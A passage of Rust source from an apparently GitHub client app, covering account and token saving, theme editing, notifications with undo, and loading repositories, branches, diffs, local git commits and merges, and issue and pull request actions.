            std::env::remove_var("GITHUB_USER");
        }
        let mut cfg = (*self.cfg).clone();
        cfg.user = user;
        cfg.token = token;
        let user_file = config::user_env_file().display().to_string();
        cfg.env_file = Some(user_file.clone());
        cfg.sources.user = cfg.user.as_ref().map(|_| config::Source::UserFile(user_file.clone()));
        cfg.sources.token = cfg.token.as_ref().map(|_| config::Source::UserFile(user_file.clone()));
        // If the token is now saved in the user settings file, ensure the API host
        // is tied to that file or the default; an external project .env or REPOHUB_ENV
        // must not redirect the newly saved token.
        if cfg.token.is_some() && cfg.sources.api != Some(config::Source::Environment) {
            let user_env_api = std::fs::read_to_string(config::user_env_file()).ok().and_then(|s| {
                    config::parse_env(&s).into_iter().find(|(k, v)| k == "GITHUB_API_URL" && !v.trim().is_empty()).map(|(_, v)| v.trim_end_matches('/').to_owned())
                });
            if let Some(user_api) = user_env_api {
                cfg.api = user_api;
                cfg.sources.api = Some(config::Source::UserFile(user_file));
            } else {
                cfg.api = "https://api.github.com".into();
                cfg.sources.api = Some(config::Source::Default);
            }
        }
        self.cfg = Arc::new(cfg);
        self.acct_error = None;
        self.acct_token.clear();
        if sign_out {
            self.acct_user.clear();
        }
        self.reset_account_state();
        if self.cfg.live() {
            self.set_status(Status::Starting);
            self.refresh();
            self.notify("Account saved. Loading your repositories…");
        } else {
            self.now = net::now();
            self.data = Data::sample();
            self.set_status(Status::Sample);
            self.notify("Signed out. Showing the sample data.");
        }
    }

    /// The phone app: the account is kept by the app's own side (`PUT api/account`), which
    /// answers with the new configuration. The token never comes back to the page.
    #[cfg(target_arch = "wasm32")]
    fn save_account(&mut self, sign_out: bool) {
        if self.cfg.account_locked {
            return;
        }
        let Some(h) = self.handle.clone() else { return };
        let user = self.acct_user.text.trim().trim_start_matches('@').to_owned();
        let typed = self.acct_token.text.trim().to_owned();
        if !sign_out && user.is_empty() && typed.is_empty() && self.cfg.token.is_none() {
            self.acct_error = Some("Type your GitHub user name, a token, or both.".into());
            return;
        }
        // An empty token keeps the saved one (`null`).
        let body = serde_json::json!({
            "signOut": sign_out,
            "user": user,
            "token": if typed.is_empty() { serde_json::Value::Null } else { typed.into() },
        }).to_string();
        net::spawn(h, move || async move {
            let r = net::request("PUT", "api/account", "application/json", &body).await?;
            if r.status != 200 {
                return Err(if r.body.trim().is_empty() { format!("The account wasn't saved ({}).", r.status) } else { r.body });
            }
            Config::from_json(&r.body).ok_or_else(|| "The account wasn't saved: the app's answer couldn't be read.".to_owned())
        }, move |s: &mut App, r: Result<Config, String>| match r {
            Err(e) => s.acct_error = Some(e),
            Ok(cfg) => {
                s.cfg = Arc::new(cfg);
                s.acct_error = None;
                s.acct_token.clear();
                if sign_out {
                    s.acct_user.clear();
                }
                s.reset_account_state();
                if s.cfg.live() {
                    s.set_status(Status::Starting);
                    s.refresh();
                    s.notify("Account saved. Loading your repositories…");
                } else {
                    s.now = net::now();
                    s.data = Data::sample();
                    s.set_status(Status::Sample);
                    s.notify("Signed out. Showing the sample data.");
                }
            }
        });
    }

    /// The phone's back button: closes what's open, goes up a level, and leaves the app from
    /// the first page.
    #[cfg(target_arch = "wasm32")]
    fn back(&mut self) {
        if self.palette.is_some() {
            self.palette = None;
        } else if self.editing_board() {
            if let Page::Repo(full) = &self.page
                && let Some(i) = self.repo_index_of(full)
            {
                self.close_board(i);
            }
        } else if self.thread.is_some() && self.pull_diff_of.is_none() {
            self.thread = None;
        } else if self.pull_diff_of.is_some() {
            self.close_pull_diff();
        } else {
            match self.page {
                Page::Overview => net::leave_app(),
                Page::Repo(_) => self.go(Page::Repos),
                _ => self.go(Page::Overview),
            }
        }
    }

    /// Picks the theme and remembers it.
    fn set_theme(&mut self, theme: Theme) {
        state::trace("theme", &self.theme, &theme);
        self.theme = theme;
        prefs::save_theme(theme);
    }

    /// Uses look `id` for its appearance and shows that appearance (`shown_dark` is what's on
    /// screen now). One of your looks opens in the editor.
    fn choose_look(&mut self, id: &str, shown_dark: bool) {
        let Some(dark) = self.looks.choose(id) else { return };
        state::trace("look", &shown_dark, &id);
        if dark != shown_dark {
            self.set_theme(if dark { Theme::Dark } else { Theme::Light });
        }
        self.looks.save();
        self.edit_look(id);
    }

    /// Opens look `id` in the editor (nothing for a ready-made one).
    fn edit_look(&mut self, id: &str) {
        self.look_edit = match self.looks.get(id).filter(|t| !t.builtin) {
            Some(t) => LookEditor::of(t),
            None => LookEditor::default(),
        };
    }

    /// Makes an editable copy of look `id` and opens it.
    fn duplicate_look(&mut self, id: &str, shown_dark: bool) {
        if let Some(new) = self.looks.duplicate(id) {
            self.choose_look(&new, shown_dark);
            self.notify("Copied: change it below");
        }
    }

    fn delete_look(&mut self, id: &str) {
        let Some(at) = self.looks.all.iter().position(|t| t.id == id && !t.builtin) else { return };
        let look = self.looks.all[at].clone();
        let (light, dark) = (self.looks.light == id, self.looks.dark == id);
        if self.looks.delete(id) {
            self.looks.save();
            self.look_edit = LookEditor::default();
            self.notify_undo(format!("Deleted {}", look.name), state::Undo::Look { look, at, light, dark });
        }
    }

    /// Changes the look being edited and saves it.
    fn change_look(&mut self, f: impl FnOnce(&mut themes::Look)) {
        let id = self.look_edit.id.clone();
        if let Some(t) = self.looks.get_mut(&id) {
            f(t);
            self.looks.save();
        }
    }

    /// Takes what was typed in the editor: valid colours apply at once.
    fn look_typed(&mut self) {
        let name = self.look_edit.name.text.trim().to_owned();
        let image = self.look_edit.image.text.trim().to_owned();
        let colors: Vec<Option<String>> = self.look_edit.colors.iter().map(|e| themes::parse_hex(&e.text)).collect();
        self.change_look(|t| {
            if !name.is_empty() {
                t.name = name;
            }
            t.image = image;
            for (i, c) in colors.into_iter().enumerate() {
                if let Some(c) = c {
                    t.colors[i] = c;
                }
            }
        });
    }

    /// Shows a short message at the bottom of the window; it goes away after a few seconds.
    fn notify(&mut self, msg: impl Into<String>) {
        self.show_toast(msg.into(), ToastKind::Done, 4500);
    }

    /// Like `notify`, with **Undo**; shown longer, so there's time to press it.
    fn notify_undo(&mut self, msg: impl Into<String>, undo: state::Undo) {
        self.show_toast(msg.into(), ToastKind::Done, 9000);
        if let Some(t) = self.toast.as_mut() {
            t.undo = Some(undo);
        }
    }

    /// Puts back what the toast's **Undo** offers.
    fn undo(&mut self) {
        let Some(undo) = self.toast.take().and_then(|t| t.undo) else { return };
        match undo {
            state::Undo::Look { look, at, light, dark } => {
                let name = look.name.clone();
                let id = look.id.clone();
                let at = at.min(self.looks.all.len());
                self.looks.all.insert(at, look);
                if light {
                    self.looks.light = id.clone();
                }
                if dark {
                    self.looks.dark = id;
                }
                self.looks.save();
                self.notify(format!("Restored {name}"));
            }
            state::Undo::Reopen { repo, issue } => {
                let number = issue.number;
                // It comes back to the list once GitHub has reopened it.
                self.reopening.push(issue);
                self.write(&repo, github::Write::ReopenIssue(number));
            }
        }
    }

    /// Like `notify`, for something that went wrong: marked as a problem and shown longer.
    fn notify_problem(&mut self, msg: impl Into<String>) {
        self.show_toast(msg.into(), ToastKind::Problem, 8000);
    }

    fn show_toast(&mut self, text: String, kind: ToastKind, ms: u32) {
        self.toast_id += 1;
        let id = self.toast_id;
        self.toast = Some(Toast { id, text, kind, undo: None });
        if let Some(h) = self.handle.clone() {
            net::spawn(h, move || net::sleep(ms), move |s: &mut App, _| {
                if s.toast.as_ref().is_some_and(|t| t.id == id) {
                    s.toast = None;
                }
            });
        }
    }

    fn open(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        if !matches!(&self.page, Page::Repo(f) if f.eq_ignore_ascii_case(&full)) {
            self.local_dir.clear();
            self.local_file = None;
        }
        self.go(Page::Repo(full));
        self.set_tab(i, RepoTab::Code);
        self.load_branches(i, true);
        self.load_detail(i);
    }

    /// Reloads everything from GitHub in the background.
    fn refresh(&mut self) {
        if !self.cfg.live() || !self.status.can_load() {
            return;
        }
        self.retry_after = None;
        self.last_load = Some(net::now());
        self.load_clock = Some(self.clock);
        self.set_status(Status::Loading);
        if let Some(h) = self.handle.clone() {
            let cfg = self.cfg.clone();
            let epoch = self.load_gen;
            net::spawn(h, move || async move { github::load_all(&cfg).await }, move |s: &mut App, r| s.apply(epoch, r));
        }
    }

    fn apply(&mut self, epoch: u64, result: Result<Data, github::LoadError>) {
        if epoch != self.load_gen {
            return;
        }
        match result {
            Ok(d) => {
                self.retry_after = d.retry_after;
                // Details of repositories nobody pushed to since stay: no new requests for them.
                let same = |full: &str| {
                    let pushed = |data: &Data| data.repos.iter().find(|r| r.full_name == full).map(|r| r.pushed);
                    pushed(&self.data).is_some_and(|p| Some(p) == pushed(&d))
                };
                let kept: HashMap<_, _> = std::mem::take(&mut self.details).into_iter()
                    .filter(|((full, _), v)| match v {
                        Load::Ready(detail) => detail.error.is_none() && detail.readme_error.is_none() && same(full),
                        _ => false,
                    }).collect();
                self.branches.clear();
                self.data = d;
                self.details = kept;
                self.loaded_at = Some(net::now());
                self.loaded_clock = Some(self.clock);
                self.now = net::now();
                self.open_pulls_page = 1;
                self.closed_pulls_page = 1;
                self.issues_page = 1;
                self.loading_more_pulls = false;
                self.loading_more_issues = false;
                self.set_status(Status::Ready);
                if let Page::Repo(full) = &self.page.clone() {
                    if let Some(i) = self.repo_index_of(full) {
                        // Keep the name as GitHub spells it now: local clones, terminals and the
                        // title are keyed by it exactly.
                        let current = self.data.repos[i].full_name.clone();
                        if current != *full {
                            self.page = Page::Repo(current);
                            self.save_place();
                            self.sync_tray();
                        }
                        self.load_detail(i);
                    } else {
                        self.go(Page::Repos);
                    }
                }
                if let Some(id) = &self.plugin_tab.clone()
                    && !self.plugins.list.iter().any(|p| p.id == *id && p.manifest.repo_tab.is_some())
                {
                    self.plugin_tab = None;
                }
                if let Page::Plugin(id) = &self.page.clone()
                    && !self.plugins.list.iter().any(|p| p.id == *id && p.manifest.page.is_some())
                {
                    self.go(Page::Overview);
                }
                self.restore_place();
                // With the lists, what's waiting for you.
                self.load_inbox();
            }
            Err(e) => {
                if let Some(ra) = e.retry_after {
                    self.retry_after = Some(ra);
                }
                self.set_status(Status::Failed(e.message));
            }
        }
    }

    /// The branch shown for repository `i`: the one picked, else the default branch.
    fn branch(&self, i: usize) -> String {
        self.data.repos.get(i).map(|r| self.branch_of.get(&r.full_name).cloned().unwrap_or_else(|| r.branch.clone())).unwrap_or_default()
    }

    fn apply_detail(&mut self, epoch: u64, key: (String, String), d: Detail) {
        if epoch == self.load_gen {
            let load = if let Some(e) = &d.error
                && d.files.is_empty()
                && d.readme.is_none()
                && d.languages.is_empty()
                && d.commit.is_none()
            {
                Load::Failed(e.clone())
            } else {
                Load::Ready(d)
            };
            self.details.insert(key, load);
        }
    }

    /// Loads files, README and last commit of repository `i` at its shown branch (once).
    fn load_detail(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let key = (full.clone(), self.branch(i));
        if self.data.sample {
            let d = model::sample_detail(r);
            self.load_local(i, false);
            self.details.insert(key, Load::Ready(d));
            return;
        }
        self.load_branches(i, false);
        self.load_local(i, false);
        if let Some(load) = self.details.get(&key) {
            match load {
                Load::Loading => return,
                Load::Ready(d) if d.error.is_none() && d.readme_error.is_none() => return,
                _ => {}
            }
        }
        self.details.insert(key.clone(), Load::Loading);
        if let Some(h) = self.handle.clone() {
            let cfg = self.cfg.clone();
            let at = key.1.clone();
            let epoch = self.load_gen;
            net::spawn(h, move || async move { github::load_detail(&cfg, &full, &at).await }, move |s: &mut App, d| {
                s.apply_detail(epoch, key, d);
            });
        }
    }

    /// Lists repository `i`'s local clone, if one is known (`again`: even if listed already).
    fn load_local(&mut self, i: usize, again: bool) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(dir) = clones_shim::find(&full) else { return };
        if !again && matches!(self.local.get(&full), Some(Load::Ready(_) | Load::Loading)) {
            return;
        }
        let Some(h) = self.handle.clone() else { return };
        if !matches!(self.local.get(&full), Some(Load::Ready(_))) {
            self.local.insert(full.clone(), Load::Loading);
        }
        let epoch = self.load_gen;
        net::spawn(h, move || async move { local::scan(&dir) }, move |s: &mut App, r| {
            if s.load_gen == epoch {
                s.local.insert(full, r.into());
            }
        });
    }

    /// Reads what changed in repository `i`'s local clone, and shows it as a diff.
    fn load_changes(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(root) = clones_shim::find(&full) else { return };
        let Some(h) = self.handle.clone() else { return };
        if self.diff_of.as_ref() != Some(&diffs::DiffOf::Local(full.clone())) {
            self.diff.set_files(Vec::new());
            if !matches!(&self.diff_of, Some(diffs::DiffOf::Merge(f, _)) if *f == full) {
                self.changes = None;
            }
        }
        self.merge_preview = None;
        self.diff_of = Some(diffs::DiffOf::Local(full.clone()));
        self.diff_load = Some(Load::Loading);
        let epoch = self.load_gen;
        net::spawn(h, move || async move { local::changes(&root) }, move |s: &mut App, r| {
            if s.load_gen != epoch || s.diff_of != Some(diffs::DiffOf::Local(full)) {
                return;
            }
            match r {
                Ok(c) => {
                    s.diff.set_files(diffs::local_files(&c));
                    s.changes = Some(c);
                    s.diff_load = Some(Load::Ready(()));
                }
                Err(e) => s.diff_load = Some(Load::Failed(e)),
            }
        });
    }

    /// Runs a git command (`job` names it on screen) in repository `i`'s clone, then reads the
    /// changes and the file list again.
    fn git_run(&mut self, i: usize, job: &'static str, done: &'static str, f: impl FnOnce(&std::path::Path) -> Result<String, String> + Send + 'static) {
        if self.git_job.is_some() {
            return;
        }
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(root) = clones_shim::find(&full) else {
            // Say why nothing happens rather than doing nothing.
            self.notify_problem(format!("There's no local copy of {full} on this computer: pick its folder in the Terminal tab, or clone it there."));
            return;
        };
        let Some(h) = self.handle.clone() else { return };
        self.git_job = Some(job);
        self.git_error = None;
        let epoch = self.load_gen;
        net::spawn(h, move || async move { f(&root) }, move |s: &mut App, r| {
            s.git_job = None;
            if s.load_gen != epoch {
                return;
            }
            match r {
                Ok(extra) => {
                    s.notify(if extra.is_empty() { done.to_owned() } else { format!("{done} {extra}") });
                    if done.starts_with("Committed") {
                        s.commit_msg.clear();
                    }
                }
                Err(e) => s.git_error = Some(e),
            }
            if let Some(curr) = s.repo_index_of(&full) {
                s.load_changes(curr);
                s.load_local(curr, true);
            }
        });
    }

    fn commit(&mut self, i: usize, then_push: bool) {
        let msg = self.commit_msg.text.clone();
        if msg.trim().is_empty() {
            self.git_error = Some("Write a commit message first.".into());
            return;
        }
        if then_push {
            self.git_run(i, "Committing and pushing…", "Committed and pushed", move |root| {
                let sha = local::commit_all(root, &msg)?;
                local::push(root).map(|_| sha)
            });
        } else {
            self.git_run(i, "Committing…", "Committed", move |root| local::commit_all(root, &msg));
        }
    }

    /// Shows what merging local `branch` into the checked-out one would bring.
    fn preview_merge(&mut self, i: usize, branch: String) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(root) = clones_shim::find(&full) else { return };
        let Some(h) = self.handle.clone() else { return };
        let key = diffs::DiffOf::Merge(full, branch.clone());
        self.diff_of = Some(key.clone());
        self.diff_load = Some(Load::Loading);
        self.diff.set_files(Vec::new());
        self.merge_preview = None;
        let epoch = self.load_gen;
        net::spawn(h, move || async move { local::merge_preview(&root, &branch) }, move |s: &mut App, r| {
            if s.load_gen != epoch || s.diff_of != Some(key) {
                return;
            }
            match r {
                Ok(p) => {
                    s.diff.set_files(rune_kit::diff::parse(&p.patch));
                    s.merge_preview = Some(p);
                    s.diff_load = Some(Load::Ready(()));
                }
                Err(e) => s.diff_load = Some(Load::Failed(e)),
            }
        });
    }

    /// Merges local `branch` into the checked-out branch.
    fn merge_local(&mut self, i: usize, branch: String) {
        let b = branch.clone();
        self.git_run(i, "Merging…", "Merged:", move |root| match local::merge(root, &b)? {
            local::Merged::Done(summary) => Ok(summary),
            local::Merged::UpToDate => Ok("already up to date".into()),
            local::Merged::Conflicts(files) => Err(format!("{} file{} in conflict: resolve them, then Commit here to finish the merge (or Abort).", files.len(), if files.len() == 1 { "" } else { "s" })),
        });
    }

    fn apply_pull_diff(&mut self, epoch: u64, key: (String, u32), r: Result<Vec<github::PullFile>, String>) {
        if epoch != self.load_gen || self.pull_diff_of != Some(key) {
            return;
        }
        match r {
            Ok(files) => {
                self.pull_diff.set_files(diffs::pull_files(&files));
                self.pull_diff_load = Some(Load::Ready(()));
            }
            Err(e) => self.pull_diff_load = Some(Load::Failed(e)),
        }
    }

    /// Shows pull request `number` of `full`'s files as a diff.
    fn open_pull_diff(&mut self, full: String, number: u32) {
        let key = (full.clone(), number);
        // A merge confirmation belongs to the diff it was asked from.
        self.confirm_merge = None;
        self.pull_diff_of = Some(key.clone());
        self.pull_diff_load = Some(Load::Loading);
        self.pull_diff.set_files(Vec::new());
        if self.data.sample {
            self.pull_diff.set_files(diffs::pull_files(&diffs::sample_pull_files()));
            self.pull_diff_load = Some(Load::Ready(()));
            return;
        }
        let Some(h) = self.handle.clone() else {
            self.pull_diff_load = Some(Load::Failed("The app isn't ready to load this diff yet: try again in a moment.".into()));
            return;
        };
        let cfg = self.cfg.clone();
        let epoch = self.load_gen;
        net::spawn(h, move || async move { github::load_pull_files(&cfg, &full, number).await }, move |s: &mut App, r| {
            s.apply_pull_diff(epoch, key, r);
        });
    }

    fn close_pull_diff(&mut self) {
        if self.pull_diff_of.is_some() {
            self.confirm_merge = None;
        }
        self.pull_diff_of = None;
        self.pull_diff_load = None;
        self.pull_diff.set_files(Vec::new());
    }

    /// Opens `path` in repository `i`'s local clone: a folder lists it, a file shows it.
    fn open_local(&mut self, i: usize, path: String, dir: bool) {
        if dir {
            self.local_dir = path;
            self.local_file = None;
            return;
        }
        let Some(root) = self.data.repos.get(i).and_then(|r| clones_shim::find(&r.full_name)) else { return };
        let Some(h) = self.handle.clone() else { return };
        self.local_file = Some((path.clone(), Load::Loading));
        let p = path.clone();
        let epoch = self.load_gen;
        net::spawn(h, move || async move { local::read(&root, &p) }, move |s: &mut App, r| {
            if s.load_gen == epoch && s.local_file.as_ref().is_some_and(|(open, _)| *open == path) {
                s.local_file = Some((path, r.into()));
            }
        });
    }

    fn apply_branches(&mut self, epoch: u64, key: String, r: Result<Vec<String>, String>) {
        if epoch != self.load_gen {
            return;
        }
        // A pull request form opened before the list arrived starts from the first other branch.
        if let (Ok(names), Some(f)) = (&r, self.form.as_mut())
            && f.repo == key && f.kind == Compose::Pull && f.from == f.into
            && let Some(other) = names.iter().find(|n| **n != f.into)
        {
            f.from = other.clone();
        }
        if let Ok(names) = &r
            && let Some(picked) = self.branch_of.get(&key)
            && !names.contains(picked)
        {
            self.branch_of.remove(&key);
            if let Page::Repo(full) = &self.page
                && full.eq_ignore_ascii_case(&key)
                && let Some(i) = self.repo_index_of(&key)
            {
                self.load_detail(i);
                if self.tab == RepoTab::Notes {
                    self.load_notes(i);
                }
            }
        }
        self.branches.insert(key, r.into());
    }

    /// Loads repository `i`'s branch list. The sample data has its default branch only.
    fn load_branches(&mut self, i: usize, force: bool) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        if !force {
            if let Some(entry) = self.branches.get(&full)
                && !matches!(entry, Load::Failed(_))
            {
                return;
            }
        } else if matches!(self.branches.get(&full), Some(Load::Loading)) {
            return;
        }
        if self.data.sample || !self.cfg.live() {
            let mut names = vec![r.branch.clone()];
            names.extend(["feature/readme-selection", "fix/theme-switch"].map(String::from));
            self.branches.insert(full, Load::Ready(names));
            return;
        }
        if !matches!(self.branches.get(&full), Some(Load::Ready(_))) {
            self.branches.insert(full.clone(), Load::Loading);
        }
        let Some(h) = self.handle.clone() else { return };
        let (cfg, default, key) = (self.cfg.clone(), r.branch.clone(), full.clone());
        let epoch = self.load_gen;
        net::spawn(h, move || async move { github::branches(&cfg, &full, &default).await }, move |s: &mut App, r: Result<Vec<String>, String>| {
            s.apply_branches(epoch, key, r);
        });
    }

    /// Shows branch `branch` of repository `i` in the Code and Notes tabs.
    fn set_branch(&mut self, i: usize, branch: String) {
        let Some(r) = self.data.repos.get(i) else { return };
        state::trace("branch", &self.branch(i), &branch);
        if branch == r.branch {
            self.branch_of.remove(&r.full_name);
        } else {
            self.branch_of.insert(r.full_name.clone(), branch);
        }
        self.confirm_delete = None;
        self.load_detail(i);
        if self.tab == RepoTab::Notes {
            self.load_notes(i);
        }
    }

    /// The branch picker chose `branch` for `slot`.
    fn pick_branch_for(&mut self, i: usize, slot: BranchSlot, branch: String) {
        self.picker = None;
        match slot {
            BranchSlot::View => self.set_branch(i, branch),
            BranchSlot::From => if let Some(f) = self.form.as_mut() { f.from = branch },
            BranchSlot::Head => if let Some(f) = self.form.as_mut() { f.from = branch },
            BranchSlot::Base => if let Some(f) = self.form.as_mut() { f.into = branch },
        }
    }

    /// Opens form `kind` for repository `i` on the section it belongs to.
    fn open_form(&mut self, i: usize, kind: Compose) {
        let Some(r) = self.data.repos.get(i) else { return };
        let (full, default, shown) = (r.full_name.clone(), r.branch.clone(), self.branch(i));
        // A pull request starts from the branch on screen, or the first other branch.
        let head = if shown != default {
            shown.clone()
        } else {
            self.branches.get(&full).and_then(Load::ready).and_then(|b| b.iter().find(|n| **n != default).cloned()).unwrap_or(shown.clone())
        };
        self.form = Some(actions::Form {
            repo: full,
            kind,
            title: TextEdit::new(""),
            body: TextEdit::new(""),
            from: if kind == Compose::Pull { head } else { shown },
            into: default,
            draft: false,
            submit: Submit::Editing,
        });
        self.picker = None;
        if self.tab != kind.tab() {
            self.set_tab(i, kind.tab());
        }
        self.load_branches(i, false);
        // `set_tab` tidies up the section it leaves; the form opened for the new one stays.
        if let Some(f) = self.form.as_mut() {
            f.title.focused = true;
        }
    }

    /// Sends the open form.
    fn submit_form(&mut self) {
        if actions::blocked(self).is_some() {
            return;
        }
        let Some(f) = self.form.as_mut() else { return };
        let Ok(w) = f.write() else { return };
        if !f.submit.start() {
            return;
        }
        let repo = f.repo.clone();
        let repo_cb = repo.clone();
        // What the screen shows for the new item until the lists reload.
        self.form_title = Some(f.title.text.trim().to_owned());
        self.pull_meta = Some((f.title.text.trim().to_owned(), f.draft));
        let Some(h) = self.handle.clone() else { return };
        let cfg = self.cfg.clone();
        let epoch = self.load_gen;
        net::spawn(h, move || async move { github::run(&cfg, &repo, w).await }, move |s: &mut App, r| {
            if s.load_gen != epoch {
                return;
            }
            match r {
                Ok(done) => {
                    s.form = None;
                    s.picker = None;
                    s.apply_done(&repo_cb, done);
                }
                Err(e) => {
                    if let Some(f) = s.form.as_mut() {
                        f.submit = Submit::Failed(e);
                    }
                }
            }
        });
    }

    /// Runs a row's write (close an issue, merge a pull request) on repository `repo`.
    fn write(&mut self, repo: &str, w: github::Write) {
        if actions::blocked(self).is_some() {
            return;
        }
        let number = w.number().unwrap_or(0);
        let key = actions::busy_key(repo, number);
        if !self.busy.insert(key.clone()) {
            return;
        }
        self.confirm_merge = None;
        let full = self.data.repos.iter()
            .find(|r| r.full_name.eq_ignore_ascii_case(repo) || (!repo.contains('/') && r.name.eq_ignore_ascii_case(repo)))
            .map(|r| r.full_name.clone()).unwrap_or_else(|| repo.to_owned());
        let full_cb = full.clone();
        let Some(h) = self.handle.clone() else { return };
        let cfg = self.cfg.clone();
        let epoch = self.load_gen;
        net::spawn(h, move || async move { github::run(&cfg, &full, w).await }, move |s: &mut App, r| {
            if s.load_gen != epoch {
                return;
            }
            s.busy.remove(&key);
            // What was typed stays in the box when sending fails.
            if let Some(t) = s.thread.as_mut().filter(|t| t.is(&full_cb, number)) {
                t.sending = false;
            }
            match r {
                Ok(done) => s.apply_done(&full_cb, done),
                Err(e) => s.notify_problem(e),
            }
        });
    }

    /// Shows what a write changed at once, without waiting for GitHub's lists to catch up.
    fn apply_done(&mut self, repo: &str, done: github::Done) {
        let about = match &done {
            github::Done::Closed(n) | github::Done::Reopened(n) | github::Done::Merged(n) | github::Done::Commented(n) | github::Done::Reviewed(n, _) => Some(*n),
            _ => None,
        };
        let sent = matches!(done, github::Done::Commented(_) | github::Done::Reviewed(..));
        self.apply_done_inner(repo, done);
        // The conversation on screen shows the change: read it again.
        if let Some(n) = about
            && let Some(t) = self.thread.as_mut().filter(|t| t.is(repo, n))
        {
            if sent {
                t.reply.clear();
            }
            self.load_thread();
        }
        self.sync_tray();
    }

    fn apply_done_inner(&mut self, repo: &str, done: github::Done) {
        let full_name = self.data.repos.iter()
            .find(|r| r.full_name.eq_ignore_ascii_case(repo) || (!repo.contains('/') && r.name.eq_ignore_ascii_case(repo)))
            .map(|r| r.full_name.clone()).unwrap_or_else(|| repo.to_owned());
        match done {
            github::Done::Issue(c) => {
                let title = self.form_title.take().unwrap_or_default();
                self.data.issues.insert(0, model::Issue { labels: Vec::new(), assignees: Vec::new(), number: c.number, title, repo: full_name.clone(), label: None, created_at: self.now, comments: 0, url: c.url });
                if let Some(r) = self.data.repos.iter_mut().find(|r| r.full_name.eq_ignore_ascii_case(&full_name)) {
                    r.issues += 1;
                }
                if let Some(t) = self.data.issues_total.as_mut() {
                    *t += 1;
                }
                self.notify(format!("Opened issue #{} in {full_name}", c.number));
            }
            github::Done::Branch(name) => {
                if let Some(Load::Ready(list)) = self.branches.get_mut(&full_name) {
                    list.push(name.clone());
                }
                self.notify(format!("Created branch {name}"));
                if let Some(curr) = self.repo_index_of(&full_name) {
                    self.set_branch(curr, name);
                } else if !full_name.is_empty() {
                    self.branch_of.insert(full_name, name);
                }
            }
            github::Done::Pull(c) => {
                let (title, draft) = self.pull_meta.take().unwrap_or_default();
                let author = self.data.profile.login.clone();
                self.data.pulls.insert(0, model::Pull { labels: Vec::new(),
                    number: c.number, title, repo: full_name.clone(), author,
                    state: if draft { PullState::Draft } else { PullState::Open },
                    checks: None, updated_at: self.now, comments: 0, url: c.url,
                });
                if let Some(t) = self.data.open_pulls_total.as_mut() {
                    *t += 1;
                }
                self.notify(format!("Opened pull request #{}", c.number));
            }
            github::Done::Closed(n) => {
                let closed = self.data.issues.iter().find(|x| x.number == n && same_repo(&x.repo, &full_name)).cloned();
                self.data.issues.retain(|x| !(x.number == n && same_repo(&x.repo, &full_name)));
                if let Some(r) = self.data.repos.iter_mut().find(|r| r.full_name.eq_ignore_ascii_case(&full_name)) {
                    r.issues = r.issues.saturating_sub(1);
                }
                if let Some(t) = self.data.issues_total.as_mut() {
                    *t = t.saturating_sub(1);
                }
                match closed {
                    Some(issue) => self.notify_undo(format!("Closed issue #{n}"), state::Undo::Reopen { repo: full_name.clone(), issue }),
                    None => self.notify(format!("Closed issue #{n}")),
                }
            }
            github::Done::Reopened(n) => {
                // An issue closed from the list and reopened with Undo goes back where it was.
                if let Some(at) = self.reopening.iter().position(|x| x.number == n && same_repo(&x.repo, &full_name)) {
                    let issue = self.reopening.remove(at);
                    if !self.data.issues.iter().any(|x| x.number == n && same_repo(&x.repo, &full_name)) {
                        self.data.issues.insert(0, issue);
                        if let Some(r) = self.data.repos.iter_mut().find(|r| r.full_name.eq_ignore_ascii_case(&full_name)) {
                            r.issues += 1;
                        }
                        if let Some(t) = self.data.issues_total.as_mut() {
                            *t += 1;
                        }
                    }
                }
                self.notify(format!("Reopened issue #{n}"));
            }
            github::Done::Commented(n) => {
                for x in self.data.issues.iter_mut().filter(|x| x.number == n && same_repo(&x.repo, &full_name)) {
                    x.comments += 1;
                }
                for p in self.data.pulls.iter_mut().filter(|p| p.number == n && same_repo(&p.repo, &full_name)) {
                    p.comments += 1;
                }
                self.notify(format!("Comment added to #{n}"));
            }
            github::Done::Reviewed(n, verdict) => self.notify(match verdict {
                thread::Verdict::Approved => format!("Approved pull request #{n}"),
                thread::Verdict::ChangesRequested => format!("Requested changes on pull request #{n}"),
                thread::Verdict::Commented => format!("Review sent on pull request #{n}"),
            }),
            github::Done::Merged(n) => {
                let mut changed = false;
                for p in self.data.pulls.iter_mut().filter(|p| p.number == n && same_repo(&p.repo, &full_name)) {
                    if matches!(p.state, PullState::Open | PullState::Draft) {
                        changed = true;
                    }
                    p.state = PullState::Merged;
                }
                if changed {
                    if let Some(t) = self.data.open_pulls_total.as_mut() {
                        *t = t.saturating_sub(1);
                    }
                    if let Some(t) = self.data.closed_pulls_total.as_mut() {
                        *t += 1;
                    }
                }
                self.notify(format!("Merged pull request #{n}"));
            }
        }
    }

    pub fn load_more_pulls(&mut self, open: bool) {
        if self.loading_more_pulls || self.data.sample {
            return;
        }
        let Some(h) = self.handle.clone() else { return };
        let cfg = self.cfg.clone();
        let login = self.data.profile.login.clone();
        if login.is_empty() {
            return;
        }
        let next_page = if open { self.open_pulls_page + 1 } else { self.closed_pulls_page + 1 };
        self.loading_more_pulls = true;
        let epoch = self.load_gen;
        net::spawn(h, move || async move {
            github::load_more_pulls(&cfg, &login, open, next_page).await
        }, move |s: &mut App, r| {
            if s.load_gen != epoch {
                return;
            }
            s.loading_more_pulls = false;
            match r {
                Ok((items, total)) => {
                    if open {
                        s.open_pulls_page = next_page;
                        s.data.open_pulls_total = Some(total);
                    } else {
                        s.closed_pulls_page = next_page;
                        s.data.closed_pulls_total = Some(total);
                    }
                    for p in items {
                        if !s.data.pulls.iter().any(|existing| existing.number == p.number && existing.repo.eq_ignore_ascii_case(&p.repo)) {
                            s.data.pulls.push(p);
                        }
                    }
                    s.sync_tray();
                }
                Err(e) => {
                    s.notify_problem(format!("Could not load more pull requests: {e}"));
                }
            }
        });
    }

    pub fn load_more_issues(&mut self) {
        if self.loading_more_issues || self.data.sample {
            return;
        }
        let Some(h) = self.handle.clone() else { return };
        let cfg = self.cfg.clone();
        let login = self.data.profile.login.clone();
        if login.is_empty() {
            return;
        }
